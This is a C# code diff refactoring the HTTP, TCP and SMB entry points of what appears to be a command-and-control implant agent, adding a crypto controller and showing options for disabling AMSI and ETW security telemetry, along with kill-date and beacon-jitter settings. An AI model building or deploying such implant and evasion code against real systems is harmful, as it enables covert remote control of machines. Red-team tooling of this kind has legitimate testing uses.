@@ -12,12 +12,12 @@ namespace Agent
     {
         static string ID;
         static string ParentID;
-        static byte[] SessionKey;
+        static byte[] EncryptionKey;
 
-        public static void HTTPEntry(string AgentID, byte[] EncKey, DateTime KillDate, string ConnectAddress, int ConnectPort, int SleepInterval, int SleepJitter)
+        public static void HTTPEntry(string AgentID, DateTime KillDate, string ConnectAddress, int ConnectPort, int SleepInterval, int SleepJitter, byte[] Key)
         {
             ID = AgentID;
-            SessionKey = EncKey;
+            EncryptionKey = Key;
 
             var config = new ConfigController();
             config.Set(AgentConfig.KillDate, KillDate);
@@ -29,11 +29,11 @@ namespace Agent
             Execute(config, commModule);
         }
 
-        public static void TCPEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string BindAddress, int BindPort)
+        public static void TCPEntry(string AgentID, string ParentAgentID, DateTime KillDate, string BindAddress, int BindPort, byte[] Key)
         {
             ID = AgentID;
             ParentID = ParentAgentID;
-            SessionKey = EncKey;
+            EncryptionKey = Key;
 
             var config = new ConfigController();
             config.Set(AgentConfig.KillDate, KillDate);
@@ -43,11 +43,11 @@ namespace Agent
             Execute(config, commModule);
         }
 
-        public static void SMBEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string PipeName)
+        public static void SMBEntry(string AgentID, string ParentAgentID, DateTime KillDate, string PipeName, byte[] Key)
         {
             ID = AgentID;
             ParentID = ParentAgentID;
-            SessionKey = EncKey;
+            EncryptionKey = Key;
 
             var config = new ConfigController();
             config.Set(AgentConfig.KillDate, KillDate);
@@ -64,7 +64,13 @@ namespace Agent
             Config.Set(AgentConfig.DisableAMSI, false);
             Config.Set(AgentConfig.DisableETW, false);
 
-            var agent = new AgentController(ID, SessionKey, CommModule, Config);
+            var crypto = new CryptoController(EncryptionKey);
+
+            var agent = new AgentController(CommModule, crypto, Config)
+            {
+                AgentID = ID,
+                ParentAgentID = ParentID
+            };
 
             CommModule.Init(Config);
             CommModule.Start();
